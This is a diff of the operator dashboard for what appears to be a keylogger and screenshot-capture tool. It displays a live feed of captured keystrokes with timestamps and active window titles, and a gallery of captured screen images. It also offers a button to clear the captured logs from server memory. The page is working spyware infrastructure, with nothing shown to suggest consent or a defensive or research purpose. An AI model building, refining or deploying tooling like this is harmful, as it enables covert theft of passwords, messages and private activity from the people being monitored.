@@ -37,7 +37,6 @@
     pointer-events:none; z-index:0;
   }
 
-  /* NAV */
   nav {
     position:sticky; top:0; z-index:100;
     background:rgba(10,10,15,.95);
@@ -47,112 +46,104 @@
     padding:0 28px; height:56px;
   }
   .nav-logo { display:flex; align-items:center; gap:10px; }
-  .logo-mark {
-    width:28px; height:28px;
-    border:1.5px solid var(--accent);
-    display:grid; place-items:center;
-    font-family:'Share Tech Mono',monospace;
-    font-size:11px; color:var(--accent);
-  }
+  .logo-mark { width:28px; height:28px; border:1.5px solid var(--accent); display:grid; place-items:center; font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--accent); }
   .logo-text { font-family:'Share Tech Mono',monospace; font-size:13px; letter-spacing:3px; text-transform:uppercase; }
   .nav-right { display:flex; align-items:center; gap:16px; }
   .live-badge { display:flex; align-items:center; gap:6px; font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--accent); }
   .live-dot { width:7px; height:7px; border-radius:50%; background:var(--accent); animation:pulse 1.5s ease-in-out infinite; }
   @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.4;transform:scale(.7)} }
-  .btn-clear { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; text-transform:uppercase; background:transparent; border:1px solid var(--danger); color:var(--danger); padding:6px 14px; cursor:pointer; border-radius:2px; transition:background .2s; }
-  .btn-clear:hover { background:rgba(255,51,102,.1); }
-  .btn-logout { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; text-transform:uppercase; background:transparent; border:1px solid var(--border); color:var(--muted); padding:6px 14px; cursor:pointer; border-radius:2px; text-decoration:none; transition:border-color .2s,color .2s; }
-  .btn-logout:hover { border-color:var(--text); color:var(--text); }
+  .btn { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; text-transform:uppercase; background:transparent; padding:6px 14px; cursor:pointer; border-radius:2px; transition:all .2s; text-decoration:none; }
+  .btn-danger { border:1px solid var(--danger); color:var(--danger); }
+  .btn-danger:hover { background:rgba(255,51,102,.1); }
+  .btn-muted { border:1px solid var(--border); color:var(--muted); }
+  .btn-muted:hover { border-color:var(--text); color:var(--text); }
 
-  /* MAIN */
-  main { position:relative; z-index:1; padding:28px; display:grid; grid-template-rows:auto auto auto 1fr; gap:20px; max-width:1400px; width:100%; margin:0 auto; }
+  main { position:relative; z-index:1; padding:24px 28px; display:flex; flex-direction:column; gap:20px; max-width:1400px; width:100%; margin:0 auto; }
 
   /* STATS */
-  .stats-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:16px; }
-  .stat-card { background:var(--surface); border:1px solid var(--border); border-radius:2px; padding:20px 22px; position:relative; overflow:hidden; }
+  .stats-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:14px; }
+  .stat-card { background:var(--surface); border:1px solid var(--border); border-radius:2px; padding:16px 20px; position:relative; overflow:hidden; }
   .stat-card::before { content:''; position:absolute; top:0; left:0; width:3px; height:100%; }
   .stat-card.green::before { background:var(--accent); }
   .stat-card.blue::before  { background:var(--accent2); }
   .stat-card.yellow::before{ background:var(--warn); }
-  .stat-card.red::before   { background:var(--danger); }
-  .stat-label { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; margin-bottom:10px; }
-  .stat-value { font-family:'Share Tech Mono',monospace; font-size:32px; font-weight:700; line-height:1; }
+  .stat-label { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; margin-bottom:8px; }
+  .stat-value { font-family:'Share Tech Mono',monospace; font-size:28px; font-weight:700; line-height:1; }
   .stat-card.green  .stat-value { color:var(--accent); }
   .stat-card.blue   .stat-value { color:var(--accent2); }
   .stat-card.yellow .stat-value { color:var(--warn); }
-  .stat-card.red    .stat-value { color:var(--danger); }
-
-  /* TOP WINDOWS */
-  .top-windows { background:var(--surface); border:1px solid var(--border); border-radius:2px; padding:20px 22px; }
-  .section-title { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:3px; color:var(--muted); text-transform:uppercase; margin-bottom:16px; }
-  .window-bar { display:flex; align-items:center; gap:12px; margin-bottom:10px; }
-  .window-name { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text); width:220px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; flex-shrink:0; }
-  .bar-track { flex:1; height:4px; background:var(--border); border-radius:2px; overflow:hidden; }
-  .bar-fill  { height:100%; background:linear-gradient(90deg,var(--accent),var(--accent2)); border-radius:2px; transition:width .6s ease; }
-  .window-count { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--muted); width:40px; text-align:right; flex-shrink:0; }
 
   /* TABS */
-  .tab-bar { display:flex; gap:0; border-bottom:1px solid var(--border); }
-  .tab-btn {
-    font-family:'Share Tech Mono',monospace; font-size:11px; letter-spacing:2px; text-transform:uppercase;
-    background:transparent; border:none; border-bottom:2px solid transparent;
-    color:var(--muted); padding:12px 22px; cursor:pointer; transition:color .2s,border-color .2s;
-    margin-bottom:-1px;
-  }
+  .panel { background:var(--surface); border:1px solid var(--border); border-radius:2px; display:flex; flex-direction:column; flex:1; overflow:hidden; min-height:500px; }
+  .tab-bar { display:flex; border-bottom:1px solid var(--border); }
+  .tab-btn { font-family:'Share Tech Mono',monospace; font-size:11px; letter-spacing:2px; text-transform:uppercase; background:transparent; border:none; border-bottom:2px solid transparent; color:var(--muted); padding:12px 22px; cursor:pointer; transition:color .2s,border-color .2s; margin-bottom:-1px; }
   .tab-btn.active { color:var(--accent); border-bottom-color:var(--accent); }
   .tab-btn:hover:not(.active) { color:var(--text); }
 
-  /* LOG PANEL */
-  .panel { background:var(--surface); border:1px solid var(--border); border-radius:2px; display:flex; flex-direction:column; overflow:hidden; min-height:400px; }
-  .panel-header { display:flex; align-items:center; justify-content:space-between; padding:14px 22px; border-bottom:1px solid var(--border); background:var(--surface2); }
-  .col-headers { display:grid; grid-template-columns:160px 1fr 80px; gap:12px; padding:8px 22px; background:var(--bg); border-bottom:1px solid var(--border); }
-  .col-header { font-family:'Share Tech Mono',monospace; font-size:9px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; }
-  .log-body { flex:1; overflow-y:auto; font-family:'Share Tech Mono',monospace; font-size:12px; }
-  .log-body::-webkit-scrollbar { width:4px; }
-  .log-body::-webkit-scrollbar-track { background:var(--bg); }
-  .log-body::-webkit-scrollbar-thumb { background:var(--border); }
-  .log-row { display:grid; grid-template-columns:160px 1fr 80px; gap:12px; padding:7px 22px; border-bottom:1px solid rgba(30,30,46,.5); transition:background .15s; animation:rowIn .3s ease forwards; }
-  @keyframes rowIn { from{opacity:0;transform:translateX(-6px)} to{opacity:1;transform:translateX(0)} }
-  .log-row:hover { background:var(--surface2); }
-  .log-ts { color:var(--muted); font-size:11px; }
-  .log-window { color:var(--accent2); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-  .log-key { color:var(--accent); text-align:right; font-weight:700; }
-  .log-key.special { color:var(--warn); }
-  .empty-state { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px; height:200px; color:var(--muted); font-family:'Share Tech Mono',monospace; font-size:12px; letter-spacing:2px; }
-  .empty-icon { font-size:32px; opacity:.3; }
-
-  /* SCREENSHOTS GRID */
-  .ss-grid { padding:20px 22px; display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:16px; overflow-y:auto; }
-  .ss-card { background:var(--bg); border:1px solid var(--border); border-radius:2px; overflow:hidden; cursor:pointer; transition:border-color .2s,transform .2s; animation:rowIn .3s ease forwards; }
-  .ss-card:hover { border-color:var(--accent2); transform:translateY(-2px); }
-  .ss-img { width:100%; display:block; aspect-ratio:16/9; object-fit:cover; }
-  .ss-meta { padding:8px 12px; display:flex; justify-content:space-between; align-items:center; }
-  .ss-ts { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--muted); }
-  .ss-win { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--accent2); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:160px; }
-
-  /* LIGHTBOX */
-  .lightbox { display:none; position:fixed; inset:0; background:rgba(0,0,0,.92); z-index:999; align-items:center; justify-content:center; flex-direction:column; gap:12px; }
-  .lightbox.open { display:flex; }
-  .lightbox img { max-width:90vw; max-height:80vh; border:1px solid var(--border); }
-  .lightbox-meta { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--muted); letter-spacing:1px; }
-  .lightbox-close { position:absolute; top:20px; right:24px; font-family:'Share Tech Mono',monospace; font-size:13px; color:var(--muted); cursor:pointer; background:none; border:none; letter-spacing:2px; }
-  .lightbox-close:hover { color:var(--text); }
-
-  /* Search + toggle */
-  .search-input { background:var(--bg); border:1px solid var(--border); color:var(--text); font-family:'Share Tech Mono',monospace; font-size:12px; padding:6px 12px; border-radius:2px; outline:none; width:200px; transition:border-color .2s; }
+  /* TOOLBAR */
+  .toolbar { display:flex; align-items:center; justify-content:space-between; padding:10px 16px; border-bottom:1px solid var(--border); background:var(--surface2); gap:12px; flex-wrap:wrap; }
+  .search-input { background:var(--bg); border:1px solid var(--border); color:var(--text); font-family:'Share Tech Mono',monospace; font-size:12px; padding:6px 12px; border-radius:2px; outline:none; width:220px; transition:border-color .2s; }
   .search-input:focus { border-color:var(--accent); }
   .toggle-wrap { display:flex; align-items:center; gap:8px; font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:2px; color:var(--muted); cursor:pointer; user-select:none; }
-  .toggle { width:32px; height:16px; background:var(--border); border-radius:8px; position:relative; transition:background .2s; }
+  .toggle { width:32px; height:16px; background:var(--border); border-radius:8px; position:relative; transition:background .2s; flex-shrink:0; }
   .toggle.on { background:var(--accent); }
   .toggle::after { content:''; position:absolute; width:12px; height:12px; border-radius:50%; background:#fff; top:2px; left:2px; transition:transform .2s; }
   .toggle.on::after { transform:translateX(16px); }
 
-  /* Pagination */
-  .pagination { display:flex; align-items:center; gap:8px; padding:12px 22px; border-top:1px solid var(--border); background:var(--surface2); }
+  /* LOG FEED — matches original format exactly */
+  .log-body { flex:1; overflow-y:auto; font-family:'Share Tech Mono',monospace; font-size:12.5px; line-height:1.6; }
+  .log-body::-webkit-scrollbar { width:4px; }
+  .log-body::-webkit-scrollbar-track { background:var(--bg); }
+  .log-body::-webkit-scrollbar-thumb { background:var(--border); }
+
+  .log-line {
+    display:flex;
+    align-items:baseline;
+    padding:4px 16px;
+    border-bottom:1px solid rgba(30,30,46,0.4);
+    gap:0;
+    animation:rowIn .25s ease forwards;
+    white-space:nowrap;
+    overflow:hidden;
+  }
+  @keyframes rowIn { from{opacity:0;background:rgba(0,255,136,.04)} to{opacity:1;background:transparent} }
+  .log-line:hover { background:var(--surface2); }
+
+  /* The pipe separators — styled exactly like the original file */
+  .log-ts   { color:var(--muted); flex-shrink:0; }
+  .sep      { color:#333350; padding:0 8px; flex-shrink:0; }
+  .log-win  { color:var(--accent2); overflow:hidden; text-overflow:ellipsis; flex:1; min-width:0; }
+  .log-key  { flex-shrink:0; padding-left:8px; font-weight:700; }
+  .log-key.char    { color:var(--accent); }
+  .log-key.special { color:var(--warn); }
+  .log-key.control { color:var(--danger); }
+
+  .empty-state { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:10px; height:300px; color:var(--muted); font-family:'Share Tech Mono',monospace; font-size:12px; letter-spacing:2px; }
+  .empty-icon { font-size:36px; opacity:.2; }
+
+  /* PAGINATION */
+  .pagination { display:flex; align-items:center; gap:8px; padding:10px 16px; border-top:1px solid var(--border); background:var(--surface2); }
   .pg-btn { font-family:'Share Tech Mono',monospace; font-size:10px; letter-spacing:1px; background:transparent; border:1px solid var(--border); color:var(--muted); padding:5px 12px; cursor:pointer; border-radius:2px; transition:all .2s; }
   .pg-btn:hover:not(:disabled) { border-color:var(--accent); color:var(--accent); }
   .pg-btn:disabled { opacity:.3; cursor:default; }
   .pg-info { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--muted); letter-spacing:1px; }
+
+  /* SCREENSHOTS */
+  .ss-grid { padding:16px; display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:14px; overflow-y:auto; }
+  .ss-card { background:var(--bg); border:1px solid var(--border); border-radius:2px; overflow:hidden; cursor:pointer; transition:border-color .2s,transform .15s; }
+  .ss-card:hover { border-color:var(--accent2); transform:translateY(-2px); }
+  .ss-img { width:100%; display:block; aspect-ratio:16/9; object-fit:cover; }
+  .ss-meta { padding:7px 12px; display:flex; justify-content:space-between; align-items:center; gap:8px; }
+  .ss-ts  { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--muted); flex-shrink:0; }
+  .ss-win { font-family:'Share Tech Mono',monospace; font-size:10px; color:var(--accent2); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+
+  /* LIGHTBOX */
+  .lightbox { display:none; position:fixed; inset:0; background:rgba(0,0,0,.93); z-index:999; align-items:center; justify-content:center; flex-direction:column; gap:12px; }
+  .lightbox.open { display:flex; }
+  .lightbox img { max-width:92vw; max-height:82vh; border:1px solid var(--border); }
+  .lb-meta { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--muted); letter-spacing:1px; }
+  .lb-close { position:absolute; top:20px; right:24px; font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--muted); cursor:pointer; background:none; border:none; letter-spacing:2px; }
+  .lb-close:hover { color:var(--text); }
 </style>
 </head>
 <body>
@@ -164,8 +155,8 @@
   </div>
   <div class="nav-right">
     <div class="live-badge"><div class="live-dot"></div>LIVE</div>
-    <button class="btn-clear" onclick="clearLogs()">CLEAR ALL</button>
-    <a href="/logout" class="btn-logout">LOGOUT</a>
+    <button class="btn btn-danger" onclick="clearLogs()">CLEAR ALL</button>
+    <a href="/logout" class="btn btn-muted">LOGOUT</a>
   </div>
 </nav>
 
@@ -183,57 +174,40 @@
     </div>
     <div class="stat-card yellow">
       <div class="stat-label">Screenshots</div>
-      <div class="stat-value" id="stat-screenshots">—</div>
-    </div>
-    <div class="stat-card red">
-      <div class="stat-label">Current Page</div>
-      <div class="stat-value" id="stat-page">1</div>
+      <div class="stat-value" id="stat-ss">—</div>
     </div>
   </div>
 
-  <!-- TOP WINDOWS -->
-  <div class="top-windows">
-    <div class="section-title">// Top Active Windows</div>
-    <div id="windows-list"></div>
-  </div>
-
-  <!-- TABS + PANEL -->
+  <!-- PANEL -->
   <div class="panel">
     <div class="tab-bar">
       <button class="tab-btn active" id="tab-keys" onclick="switchTab('keys')">⌨ Keystrokes</button>
       <button class="tab-btn"        id="tab-ss"   onclick="switchTab('ss')">📸 Screenshots</button>
     </div>
 
-    <!-- KEYSTROKE TAB -->
-    <div id="pane-keys">
-      <div class="panel-header">
+    <!-- KEYSTROKE PANE -->
+    <div id="pane-keys" style="display:flex;flex-direction:column;flex:1;overflow:hidden;">
+      <div class="toolbar">
         <input class="search-input" type="text" id="search-input" placeholder="Filter by window..." oninput="filterLogs()"/>
-        <label class="toggle-wrap" onclick="toggleAutoRefresh()">
-          AUTO-REFRESH
-          <div class="toggle on" id="ar-toggle"></div>
+        <label class="toggle-wrap" onclick="toggleAR()">
+          AUTO-REFRESH <div class="toggle on" id="ar-toggle"></div>
         </label>
-      </div>
-      <div class="col-headers">
-        <div class="col-header">Timestamp</div>
-        <div class="col-header">Window</div>
-        <div class="col-header" style="text-align:right">Key</div>
       </div>
       <div class="log-body" id="log-body"></div>
       <div class="pagination">
         <button class="pg-btn" id="prev-btn" onclick="changePage(-1)" disabled>← PREV</button>
-        <span class="pg-info" id="pg-info">Page 1</span>
+        <span class="pg-info" id="pg-info">Page 1 / 1</span>
         <button class="pg-btn" id="next-btn" onclick="changePage(1)">NEXT →</button>
-        <span class="pg-info" style="margin-left:auto" id="total-info"></span>
+        <span class="pg-info" style="margin-left:auto" id="total-info">0 events</span>
       </div>
     </div>
 
-    <!-- SCREENSHOTS TAB -->
-    <div id="pane-ss" style="display:none">
-      <div class="panel-header">
-        <div class="section-title" style="margin:0">// Last 20 Screenshots (in-memory)</div>
-        <label class="toggle-wrap" onclick="toggleAutoRefresh()">
-          AUTO-REFRESH
-          <div class="toggle on" id="ar-toggle-ss"></div>
+    <!-- SCREENSHOT PANE -->
+    <div id="pane-ss" style="display:none;flex-direction:column;flex:1;overflow:hidden;">
+      <div class="toolbar">
+        <span class="pg-info">Last 20 screenshots — cleared on server restart</span>
+        <label class="toggle-wrap" onclick="toggleAR()">
+          AUTO-REFRESH <div class="toggle on" id="ar-toggle-ss"></div>
         </label>
       </div>
       <div class="ss-grid" id="ss-grid">
@@ -245,176 +219,160 @@
 </main>
 
 <!-- LIGHTBOX -->
-<div class="lightbox" id="lightbox" onclick="closeLightbox()">
-  <button class="lightbox-close" onclick="closeLightbox()">✕ CLOSE</button>
-  <img id="lb-img" src="" alt="screenshot"/>
-  <div class="lightbox-meta" id="lb-meta"></div>
+<div class="lightbox" id="lightbox" onclick="closeLb()">
+  <button class="lb-close">✕ CLOSE</button>
+  <img id="lb-img" src="" alt=""/>
+  <div class="lb-meta" id="lb-meta"></div>
 </div>
 
 <script>
-  let currentPage  = 1;
-  let autoRefresh  = true;
-  let refreshTimer = null;
-  let allLoaded    = [];
-  let filterText   = '';
-  let activeTab    = 'keys';
+  // ── State ─────────────────────────────────
+  let page       = 1;
+  let autoRef    = true;
+  let timer      = null;
+  let loaded     = [];
+  let filterTxt  = '';
+  let activeTab  = 'keys';
 
-  const SPECIAL_KEYS = ['space','enter','backspace','tab','shift','ctrl','alt',
-    'caps_lock','esc','delete','up','down','left','right',
-    'f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12',
-    'home','end','page_up','page_down'];
+  const CTRL_KEYS = ['esc','ctrl','alt','cmd','super','menu'];
+  const SPEC_KEYS = ['enter','backspace','tab','space','shift','caps_lock',
+    'delete','up','down','left','right','home','end',
+    'page_up','page_down','f1','f2','f3','f4','f5','f6',
+    'f7','f8','f9','f10','f11','f12'];
 
-  function isSpecial(k){ return SPECIAL_KEYS.some(s=>k.toLowerCase().includes(s)); }
+  function keyClass(k){
+    const l = k.toLowerCase();
+    if(CTRL_KEYS.some(s=>l===s)) return 'control';
+    if(SPEC_KEYS.some(s=>l===s)) return 'special';
+    return 'char';
+  }
 
-  // ── Data loading ──────────────────────────
-
+  // ── Fetch ─────────────────────────────────
   async function loadEvents(){
-    try {
-      const r    = await fetch(`/api/events?page=${currentPage}`);
-      const data = await r.json();
-      allLoaded  = data.events;
-      document.getElementById('stat-total').textContent = data.total;
-      document.getElementById('stat-page').textContent  = currentPage;
+    try{
+      const r = await fetch(`/api/events?page=${page}`);
+      const d = await r.json();
+      loaded  = d.events;
+      document.getElementById('stat-total').textContent = d.total;
       renderLogs();
-      updatePagination(data.total, data.per_page);
-    } catch(e){ console.error(e); }
+      updatePg(d.total, d.per_page);
+    }catch(e){ console.error(e); }
   }
 
   async function loadStats(){
-    try {
-      const r    = await fetch('/api/stats');
-      const data = await r.json();
-      document.getElementById('stat-windows').textContent     = data.top_windows.length;
-      document.getElementById('stat-screenshots').textContent = data.total_screenshots;
-      const wl  = document.getElementById('windows-list');
-      if(!data.top_windows.length){
-        wl.innerHTML='<div style="font-family:Share Tech Mono,monospace;font-size:11px;color:var(--muted);letter-spacing:2px;">NO DATA YET</div>';
-        return;
-      }
-      const max = data.top_windows[0].count;
-      wl.innerHTML = data.top_windows.map(w=>`
-        <div class="window-bar">
-          <div class="window-name">${esc(w.window)}</div>
-          <div class="bar-track"><div class="bar-fill" style="width:${Math.round(w.count/max*100)}%"></div></div>
-          <div class="window-count">${w.count}</div>
-        </div>`).join('');
-    } catch(e){ console.error(e); }
+    try{
+      const r = await fetch('/api/stats');
+      const d = await r.json();
+      document.getElementById('stat-windows').textContent = d.top_windows.length;
+      document.getElementById('stat-ss').textContent      = d.total_screenshots;
+    }catch(e){ console.error(e); }
   }
 
   async function loadScreenshots(){
-    try {
-      const r    = await fetch('/api/screenshots?limit=20');
-      const data = await r.json();
-      const grid = document.getElementById('ss-grid');
-      if(!data.screenshots.length){
-        grid.innerHTML='<div class="empty-state"><div class="empty-icon">📷</div><div>NO SCREENSHOTS YET</div></div>';
+    try{
+      const r = await fetch('/api/screenshots?limit=20');
+      const d = await r.json();
+      const g = document.getElementById('ss-grid');
+      if(!d.screenshots.length){
+        g.innerHTML='<div class="empty-state"><div class="empty-icon">📷</div><div>NO SCREENSHOTS YET</div></div>';
         return;
       }
-      grid.innerHTML = data.screenshots.map((s,i)=>`
-        <div class="ss-card" onclick="openLightbox('${s.image}','${esc(s.timestamp)} | ${esc(s.window)}')">
-          <img class="ss-img" src="data:image/jpeg;base64,${s.image}" alt="screenshot ${i+1}" loading="lazy"/>
+      g.innerHTML = d.screenshots.map(s=>`
+        <div class="ss-card" onclick="openLb('${s.image}','${esc(s.timestamp)} | ${esc(s.window)}')">
+          <img class="ss-img" src="data:image/jpeg;base64,${s.image}" loading="lazy"/>
           <div class="ss-meta">
             <span class="ss-ts">${esc(s.timestamp)}</span>
             <span class="ss-win">${esc(s.window)}</span>
           </div>
         </div>`).join('');
-    } catch(e){ console.error(e); }
+    }catch(e){ console.error(e); }
   }
 
-  // ── Render ────────────────────────────────
-
+  // ── Render logs ───────────────────────────
+  // Format: 2026-03-27 00:25:19 | New Tab - Google Chrome | s
   function renderLogs(){
     const body = document.getElementById('log-body');
-    let rows   = allLoaded;
-    if(filterText) rows = rows.filter(e=>e.window.toLowerCase().includes(filterText));
+    let rows = loaded;
+    if(filterTxt) rows = rows.filter(e=>e.window.toLowerCase().includes(filterTxt));
     if(!rows.length){
       body.innerHTML=`<div class="empty-state"><div class="empty-icon">⌨</div><div>AWAITING KEYSTROKES</div></div>`;
       return;
     }
     body.innerHTML = rows.map(e=>{
-      const sp = isSpecial(e.key);
-      return `<div class="log-row">
-        <div class="log-ts">${esc(e.timestamp)}</div>
-        <div class="log-window">${esc(e.window)}</div>
-        <div class="log-key${sp?' special':''}">${esc(e.key)}</div>
+      const cls = keyClass(e.key);
+      return `<div class="log-line">
+        <span class="log-ts">${esc(e.timestamp)}</span>
+        <span class="sep">|</span>
+        <span class="log-win">${esc(e.window)}</span>
+        <span class="sep">|</span>
+        <span class="log-key ${cls}">${esc(e.key)}</span>
       </div>`;
     }).join('');
   }
 
   function filterLogs(){
-    filterText = document.getElementById('search-input').value.toLowerCase();
+    filterTxt = document.getElementById('search-input').value.toLowerCase();
     renderLogs();
   }
 
-  function updatePagination(total, perPage){
+  function updatePg(total, perPage){
     const pages = Math.ceil(total/perPage)||1;
-    document.getElementById('pg-info').textContent   = `Page ${currentPage} / ${pages}`;
-    document.getElementById('total-info').textContent= `${total} events`;
-    document.getElementById('prev-btn').disabled = currentPage<=1;
-    document.getElementById('next-btn').disabled = currentPage>=pages;
+    document.getElementById('pg-info').textContent    = `Page ${page} / ${pages}`;
+    document.getElementById('total-info').textContent = `${total} events`;
+    document.getElementById('prev-btn').disabled = page<=1;
+    document.getElementById('next-btn').disabled = page>=pages;
   }
-
-  // ── Tabs ──────────────────────────────────
-
-  function switchTab(tab){
-    activeTab = tab;
-    document.getElementById('pane-keys').style.display = tab==='keys'?'':'none';
-    document.getElementById('pane-ss').style.display   = tab==='ss'?'':'none';
-    document.getElementById('tab-keys').className = 'tab-btn'+(tab==='keys'?' active':'');
-    document.getElementById('tab-ss').className   = 'tab-btn'+(tab==='ss'?' active':'');
-    if(tab==='ss') loadScreenshots();
-  }
-
-  // ── Lightbox ──────────────────────────────
-
-  function openLightbox(b64, meta){
-    document.getElementById('lb-img').src  = `data:image/jpeg;base64,${b64}`;
-    document.getElementById('lb-meta').textContent = meta;
-    document.getElementById('lightbox').classList.add('open');
-  }
-  function closeLightbox(){ document.getElementById('lightbox').classList.remove('open'); }
 
   // ── Controls ──────────────────────────────
+  function changePage(d){ page = Math.max(1,page+d); loadEvents(); }
 
-  function changePage(dir){
-    currentPage = Math.max(1, currentPage+dir);
-    loadEvents();
+  function switchTab(t){
+    activeTab = t;
+    document.getElementById('pane-keys').style.display = t==='keys'?'flex':'none';
+    document.getElementById('pane-ss').style.display   = t==='ss'?'flex':'none';
+    document.getElementById('tab-keys').className = 'tab-btn'+(t==='keys'?' active':'');
+    document.getElementById('tab-ss').className   = 'tab-btn'+(t==='ss'?' active':'');
+    if(t==='ss') loadScreenshots();
   }
 
-  function toggleAutoRefresh(){
-    autoRefresh = !autoRefresh;
-    document.getElementById('ar-toggle').className    = 'toggle'+(autoRefresh?' on':'');
-    document.getElementById('ar-toggle-ss').className = 'toggle'+(autoRefresh?' on':'');
-    autoRefresh ? startRefresh() : stopRefresh();
+  function toggleAR(){
+    autoRef = !autoRef;
+    const cls = 'toggle'+(autoRef?' on':'');
+    document.getElementById('ar-toggle').className    = cls;
+    document.getElementById('ar-toggle-ss').className = cls;
+    autoRef ? startTimer() : stopTimer();
   }
 
-  function startRefresh(){
-    if(refreshTimer) clearInterval(refreshTimer);
-    refreshTimer = setInterval(()=>{
-      loadEvents();
-      loadStats();
+  function startTimer(){
+    if(timer) clearInterval(timer);
+    timer = setInterval(()=>{
+      loadEvents(); loadStats();
       if(activeTab==='ss') loadScreenshots();
     }, 2000);
   }
 
-  function stopRefresh(){ if(refreshTimer) clearInterval(refreshTimer); }
+  function stopTimer(){ if(timer) clearInterval(timer); }
 
   async function clearLogs(){
-    if(!confirm('Clear ALL logs and screenshots from memory?')) return;
+    if(!confirm('Clear ALL logs and screenshots from server memory?')) return;
     await fetch('/api/clear',{method:'POST'});
-    currentPage=1;
-    loadEvents(); loadStats(); loadScreenshots();
+    page=1; loadEvents(); loadStats(); loadScreenshots();
   }
 
+  // ── Lightbox ──────────────────────────────
+  function openLb(b64,meta){
+    document.getElementById('lb-img').src        = `data:image/jpeg;base64,${b64}`;
+    document.getElementById('lb-meta').textContent = meta;
+    document.getElementById('lightbox').classList.add('open');
+  }
+  function closeLb(){ document.getElementById('lightbox').classList.remove('open'); }
+
   function esc(s){
-    return String(s)
-      .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   }
 
   // ── Init ──────────────────────────────────
-  loadEvents();
-  loadStats();
-  startRefresh();
+  loadEvents(); loadStats(); startTimer();
 </script>
 </body>
 </html>
